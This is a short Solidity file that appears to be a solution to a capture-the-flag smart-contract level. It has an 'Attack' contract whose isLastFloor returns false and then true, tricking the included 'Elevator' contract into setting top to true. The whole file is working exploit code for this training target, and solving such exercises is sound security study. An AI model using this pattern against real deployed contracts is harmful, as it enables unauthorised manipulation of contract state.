// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Attack is Building {
    bool called;

    constructor() {
        called = false;
    }

    function isLastFloor(uint) override external returns (bool) {
        if (!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    function attack(Elevator e) external {
        e.goTo(1);
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}